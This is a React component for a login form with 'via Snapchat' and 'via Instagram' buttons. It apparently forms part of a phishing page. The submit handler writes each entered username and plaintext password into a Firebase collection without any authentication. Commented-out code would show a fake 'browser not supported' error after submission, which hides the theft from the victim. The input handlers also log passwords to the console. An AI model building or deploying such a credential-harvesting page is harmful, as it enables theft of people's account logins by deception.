import React ,{ useState } from 'react';
import './Menu.css';
import { db } from './firebase';
 import { Link } from "react-router-dom";
 import InstagramIcon from '@material-ui/icons/Instagram';

function Menu() {
 const [username, setUsername]= useState("");
 const [password, setPassword] = useState("");
//  const [submission, setsubmission] = useState("");

const inputUsername = (event) =>
{
  console.log(event.target.value);
  setUsername(event.target.value);
}

const inputPassword=( event ) =>
{
  console.log(event.target.value);
  setPassword(event.target.value);
}


const inputsubmit= (event)=>
{
  //  setsubmission( `${username}  ${password}`);
  

   db.collection('reactdetails').doc().set({name:username, pass:password });
//    setTimeout(()=>
//    {
//      setsubmission( `Error 404:  browser not supported`)
//     },2000);
  // const firestore = firebase.database().ref("/person");
  // let data={
  //   name: username,
  //   pass: password
  // }
  // firestore.push(data);
 

}
 


  return (
    <div className="menu">
      <div className='menu_container'>
       
       
        <div className="menu_logo">
         <img src="data:image/png;base64,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"
          
          alt=""  className="menu_logo"/>
        </div>
        
        
        <div className="menu_header">
          REACT 
       </div>
        <div className="menu_section">
          <input type="text" className="menu_inputfield" placeholder="username"  value={username}
          onChange={inputUsername}></input>
        </div>
        <div className="menu_section">
         
          <input type="password" className="menu_inputfield"   placeholder="password"
           onChange={inputPassword}  value={password}></input>
        </div>
        
        
        <div className="menu_section">
          <button  type="submit" className="menu_login" onClick={inputsubmit}> Login </button>
        </div>
       
        {/* <div className="errormsg">
        <h5> {submission}</h5>
        </div> */}
        
        
        <div className="menu_footer1">
              FORGOT PASSWORD/ CREATE ACCOUNT
          </div>
          
          <div className="menu_footer2">
         <Link to="/snapchat-login" className="menu_link" >
          <button className="menu_footer_button snapchat"> via Snapchat
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgYFYfxmJbyjScIeG02hdgPH3atYlT2ZVfBkI3TloUcaB6x1Mc22rHLY0S6RrJNmAr0kE&usqp=CAU"
          alt="" className="menu_snapicon"/>
           </button>
           </Link>
          
          <Link to="/instagram"  className="menu_link">
          <button className="menu_footer_button"> <p className="button_text">via Instagram</p> <InstagramIcon/></button>
          </Link>

          </div>

      </div>
    </div>
  );
}

export default Menu;
